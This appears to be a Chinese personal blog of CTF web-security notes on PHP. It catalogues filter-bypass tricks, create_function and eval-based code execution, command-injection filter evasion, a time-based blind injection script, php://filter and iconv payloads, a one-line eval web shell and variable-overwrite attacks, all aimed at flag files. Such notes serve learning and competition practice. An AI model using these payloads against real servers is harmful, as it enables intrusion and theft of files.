---
title: interesting2
date: 2023-07-26 18:08:18
categories:
- 网络安全
tags:
- web 
description: |
    承接上文,记录有趣
---
### php

#### 函数

##### `trim`

```php
语法
trim(string,charlist)

参数  描述
string          必需。规定要检查的字符串。
charlist        可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

"\0"       - NULL
"\t"       - 制表符
"\n"       - 换行
"\x0B"     - 垂直制表符
"\r"       - 回车
" "        - 空格
```

```php
if(trim($x)!=='1' &&  is_numeric($x)){
        echo urlencode(chr($i))."\n";
   }
```

-->`+`,`-`,`.`,`%0C`

##### `preg_match`

- 数组绕过 返回false

- 回溯绕过 回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万,preg_match返回的非1和0，而是false

- 换行绕过.用于任意字符匹配并不包括换行符，而且^ $界定了必须在同一行，否则匹配不到，直接利用%0a

```php
\i 
不区分(ignore)大小写

\m
多(more)行匹配
若存在换行\n并且有开始^或结束$符的情况下，
将以换行为分隔符，逐行进行匹配
$str = "abc\nabc";
$preg = "/^abc$/m";
preg_match($preg, $str,$matchs);
这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。

\s
特殊字符圆点 . 中包含换行符
默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符
$str = "abggab\nacbs";
$preg = "/b./s";
preg_match_all($preg, $str,$matchs);
这样匹配到的有三个 bg b\n bs

\A
强制从目标字符串开头匹配;

\D
如果使用$限制结尾字符,则不允许结尾有换行; 

\e
### preg_replace /e
配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 所以可以进行rce
`/?.*={${phpinfo()}}`
`\S*=${phpinfo()}`
```

[不懂啊](https://xz.aliyun.com/t/2557)

##### `Int_val`

```php
intval (mixed $var [, int $base = 10] ) : int

Note: 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 "0" 开始，使用 8 进制 (octal)；否则， 将使用 10 进制 (decimal)。

也可以使用科学计数法

intval('4476.0')===4476 小数点
intval('+4476.0')===4476 正负号 intval('4476e0')===4476 科学计数法 intval('0x117c')===4476 16 进制 intval('010574')===4476 8 进制 intval('010574')===4476 8 进制 + 空格
```

##### `is_numeric`

```php
过base64 + hex 之后的字符串仅包含 [0-9] 和 e, 才能够绕过 is_numeric() 的检测
5044383959474e6864434171594473 // <?=`cat *`;

```

##### `$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`

```php
query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据

url?$fl0g=flag_give_me;
get变量赋值
```

##### `gettext拓展，开启此拓展_() 等效于 gettext()`

`get_defined_vars ( void ):`
array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量

##### `call_user_func`

```php
call_user_func(callable $callback, mixed ...$args): mixed

callback
将被调用的回调函数（callable）。

传入call_user_func()的参数不能为引用传递。

args
0个或以上的参数，被传入回调函数。

eg:
<?php
function barber($type)
{
    echo "You wanted a $type haircut, no problem\n";
}
call_user_func('barber', "mushroom");
call_user_func('barber', "shave");
?>
```

```php
call_user_func() 命名空间的使用

<?php

namespace Foobar;

class Foo {
    static public function test() {
        print "Hello world!\n";
    }
}

call_user_func(__NAMESPACE__ .'\Foo::test');
call_user_func(array(__NAMESPACE__ .'\Foo', 'test'));

?>
```

```php
用call_user_func()来调用一个类里面的方法
<?php

class myclass {
    static function say_hello()
    {
        echo "Hello!\n";
    }
}

$classname = "myclass";

call_user_func(array($classname, 'say_hello'));
call_user_func($classname .'::say_hello');

#数组
$myobject = new myclass();
call_user_func(array($myobject, 'say_hello'));

?>
```

```php
把完整的函数作为回调传入call_user_func()
<?php
call_user_func(function($arg) { print "[$arg]\n"; }, 'test');
?>

以上示例会输出：

[test]
```

##### create_function()

'''
`create_function` 是 PHP 的一个内置函数，但是在 PHP 7.2.0 以后，这个函数已经被废弃，官方文档中推荐使用匿名函数作为替代。

例如：

```php
<?php
$newfunc = create_function('$x', 'return $x * $x;');
echo "Square of 3 is " . $newfunc(3);
?>
```

在这个例子中，`create_function` 创建了一个新函数，这个函数接收一个参数 x 并且返回 x 的平方。然后我们用这个新函数来计算 3 的平方。

**create_function 函数在 PHP 内部实际上是使用了 eval() 函数来创建新的函数。**

```php
<?php
//sorry , here is true last level
//^_^
error_reporting(0);
include "str.php";

$a = $_GET['a'];
$b = $_GET['b'];
if(preg_match('/^[a-z0-9_]*$/isD',$a)){
    show_source(__FILE__);
}
else{
    $a('',$b);
}

URL query example: ?a=\create_function&b=}system('tac /flag');//
```

在上面这个例子中，`\`被用来绕过正则表达式（其他符号试过貌似都不行），`}` 是结束前一个函数体，`//` 是注释后面的内容。总的来说，这个例子是利用 `create_function` 来执行 `tac /flag`.
'''

直接对着闭合就行,name处也可以注入

```php
源代码：
function fT($a) {
  echo "test".$a;
}
 
注入后代码：
function fT($a) {
  echo "test";}
  phpinfo();/*;//此处为注入代码。
}
```

##### get_defined_vars()

获取所有文件（包括包含的文件）变量的值

##### file_get_contents()

懂得都懂

##### phpinfo()

懂得都懂

##### require_once

在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，那么我们可以尝试绕过这个机制吗？不写入webshell只读文件有办法吗？

```php
<?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    require_once($content);
} //题目的代码来自WMCTF2020 make php great again 2.0 绕过require_once是预期解
```

/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里就可以用伪协议配合多级符号链接的办法进行绕过

```bash
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

[不懂先记着](https://www.anquanke.com/post/id/213235)

##### ereg() / eregi()

NULL截断漏洞：
ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。

ereg()只能处理字符串的，遇到数组做参数返回NULL。

##### strpos()

- 以数组为参数
strpos()函数如果传入数组，便会返回NULL。
- 二次编码绕关键字
[参考](https://bugs.php.net/bug.php?id=76671)
- 大小写绕过
strpos() 函数对大小写敏感

##### strcmp()

`strcmp()`函数比较两个字符串(区分大小写)，定义中是比较字符串类型的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0。

##### is_file() / file_exists()

超过20次软链接后可以绕过：
`?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php`

`is_file`在使用php的伪协议时候会返回false，除了file://协议以外
`file_exists()`构造不存在的文件
`/nice/../../proc/self/cwd/flag.php` `./nice/../flag.php`

#### php特性之`[`->`_`

php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、`+`、`.`、`[` 转换为下划线
但是`[`提前出现后，`[` 会转换成下划线，而后面的字符就不会再被转义了。

#### php伪随机数

`/Users/dionysus/PHP/一些具体的题/伪随机数脚本前.py`
得到target
`cd /Users/dionysus/Downloads/php_mt_seed-4.0`
`time ./php_mt_seed target`
得到种子
`time ./php_mt_seed 762464408`
然后`/Users/dionysus/PHP/一些具体的题/伪随机数脚本后.php`

#### 短标签

`?><?= ·tail /f*·?·>` 这里·指反引号 内联执行
这个标签可以直接输出括号中的内容

#### 命令执行

#### 无过滤或简单过滤

```bash
ls|tee 1.txt #命令输出到1.txt文件中
file | base64 #也可以写成 base64 file
#127.0.0.1& cat 1382668722644.php | base64
代替cat
od #以8进制输出文件
rev #反转读取
cat #由第一行开始显示内容，并将所有内容输出
tac #从最后一行倒序显示内容，并将所有内容输出
more #根据窗口大小，一页一页的现实文件内容
less #和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head #只显示头几行
tail #只显示最后几行
nl #类似于cat -n，显示时输出行号
tailf #类似于tail -f
awk '{print}' 
show_source(next(array_reverse(scandir(pos(localeconv())))));

c=var_dump(scandir('.'));
a=var_dump(scandir("/")); #获取/目录
c=var_dump(file_get_contents('flag.php'));
c=var_dump(file_get_contents('php://filter/read=convert.base64-encode/resource=flag.php'));

#\拼接
fla\g

#拼接变量
a=g;fla$a

#两次编码
?url=127.0.0.1｜`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`

#先执行反引号内的东西
ls `cat /flag > /var/www/html/1.txt`

#或者使用 $() 和八进制
$()：这是一种命令替换的语法，它会执行括号内的命令，并将其结果返回给外部命令。
$(printf$IFS$9"\154\163")

#过滤空格
<
<>
%20(space)
%09(tab)
$IFS
$IFS$9
${IFS}
$IFS$1
%09
{cat,flag.php}
```

##### 命令拼接

```bash
`${PATH:~A}` `${PWD:~A}` `${IFS}` `????.???` -> `nl flag.php`
#${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}}??.???
#${PATH:~A}${PATH:${#TERM}:${SHLVL:~A}} ????.???

#/bin/base64 flag.php 这里其实${IFS}可以不用直接用空格，因为没禁
#<A 先让指令执行错误，然后 $? 取到的值就为1了
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM}${IFS}????.???
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???


#${HOME:${#HOSTNAME}:${#SHLVL}}     ====>   t
#${PWD:${Z}:${#SHLVL}}    ====>   /
#/bin/cat flag.php

${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???

#/bin/rev flag.php
#${#?}或${##}=1   ${IFS}=3
#/???/r?? ????.???
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
#linux执行下条命令，反转为原来的
#echo '}c5963f9f2c6d-761b-cd34-4aef-6e358ac7{wohsftc"=galf$'|rev
```

##### 无回显盲注脚本

```python
import requests
import time

s=requests.session()
flag=''
for z in range(1,50):
    for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%|^&{}[]/-()+=,\\':
        starTime=time.time()
        url="http://127.0.0.1/?cmd=if [ `cut -c"+str(z)+"-"+str(z)+" /flag` != '"+i+"' ]; then echo 1 ; else sleep 3; fi"
        r=s.get(url)
        if((time.time()-starTime)>3):
            flag+=i
            print(flag)
            break
    print(z)
print('the flag is'+flag)
```

##### head头执行命令

`<?php eval(getallheaders()['Cookie'])?>`
`c=session_start();system(session_id());passid=ls`

#### php://filter

- 无过滤器:

`php://filter/resource=`

- 字符串过滤器:

`php://filter/read=string.rot13/resource=`
`php://filter/read=string.toupper/resource=`
`php://filter/read=string.tolower/resource=`
`php://filter/read=string.string_tags/resource=`

- 转换过滤器:
`php://filter/read=convert.base64-encode/resource=`
`php://filter/read=convert.quoted-printable-encode/resource=`
`php://filter/read=convert.iconv.utf-8.utf-16le/resource=`

> convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用

`iconv ( string $in_charset , string $out_charset , string $str )`:将字符串`$str`从`in_charset`编码转换到`$out_charset`这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上

```php
$result = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_POST[dotast]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);

//输出结果如下：
//经过一次反转:?<hp pe@av(l_$OPTSd[tosa]t;)>?
//经过第二次反转:<?php @eval($_POST[dotast]);?>
```

```php
payload: file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
payload: file=compress.zlib://flag.php
payload: file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```

```php
filter过滤
tips:
convert.base-encode64部分可以二次url编码绕过
?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=flag.php
```

Base64编码中只包含64个可打印字符A-Za-z0-9/+=，而PHP在解码base64时，遇到不在其中的字符包括不可见字符、控制字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

```php
<?php
$url="?<_>\xefa \x89x;";  // 字母k经过base64编码后为ax
var_dump(base64_decode($url));
// string(1) "k"
```

首先我们都知道
`include "php://filter/convert.base64-decode/resource=./flag.php";`这里包含的是` flag.php `的内容经过base64编码后的结果。除了这个filter，PHP Filter 当中还有一种` convert.iconv `的` Filter `，可以用来将数据从字符集` A `转换为字符集` B `。可以通过命令` iconv -l `列出支持的字符编码，虽然列出的字符编码比较多，但一些实际上是其他字符集的别名

`convert.iconv.UTF8.CSISO2022KR`将始终在字符串前面添加`\x1b$)C`，`\x1b`是不可见字符

eg:`<?=`$_GET[0]`;;?>`
以上 payload 的 base64 编码为 `PD89YCRfR0VUWzBdYDs7Pz4=`，然后通过各种字符编码组合 fuzz 出所有单字符的编码形式，而且并不是所有出现了合法字符的编码形式就是符合要求的，然后把符合要求的组合起来即可
**代码在`/Users/dionysus/PHP/base64filter_rce.php`**

#### 变量覆盖

```php

register_global

<?php
echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";
if ($auth) {
    echo "覆盖！";
}else{
    echo "没有覆盖";
}

当访问 http://127.0.0.1/1.php时输出没有覆盖
但是当请求 http://127.0.0.1/1.php?auth=1时会覆盖掉$auth输出覆盖
```

```php
extract()
从数组中将变量导入到当前的符号表 直接看代码

<?php
$auth=false;
extract($_GET);

if ($auth){
    echo "over";
}

同样请求 http://127.0.0.1/1.php?auth=1时会覆盖掉$auth输出over
```

```php
$$符号在php中叫做可变变量，可以使变量名动态设置。举个例子

$auth=0;
foreach ($_GET as $key => $value) {
    $$key=$value;
}
echo $auth;

在第二行中遍历了全局变量$_GET，第三行将key当作变量名，把value赋值。 那么我们传入http://127.0.0.1/1.php?auth=1时会将$auth的值覆盖为1
```

```php

import_request_variables
将 GET／POST／Cookie 变量导入到全局作用域中，如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。那么和register_globals存在相同的变量覆盖问题。

$auth = '0';
import_request_variables('G');
 
if($auth == 1){
  echo "over!";
}

同样传入 http://127.0.0.1/1.php?auth=1时会将$auth的值覆盖为1，输出over!
```

```php
parse_str()
将字符串解析成多个变量

$a='aa';
$str = "a=test";
parse_str($str);
echo ${a};

可以看出来将$str解析为$a='test'，与parse_str()类似的函数还有mb_parse_str()，不在赘述。
```

#### 内置类

`eval("echo new $v1($v2());");`

```php
?v1=Exception&v2=system('tac fl36dg.txt')
或者
?v1=ReflectionClass&v2=system('tac fl36dg.txt')
或者
?v1=ReflectionMethod&v2=system('tac fl36dg.txt')

#查看目录下文件结构
?v1=FilesystemIterator&v2=getcwd
```
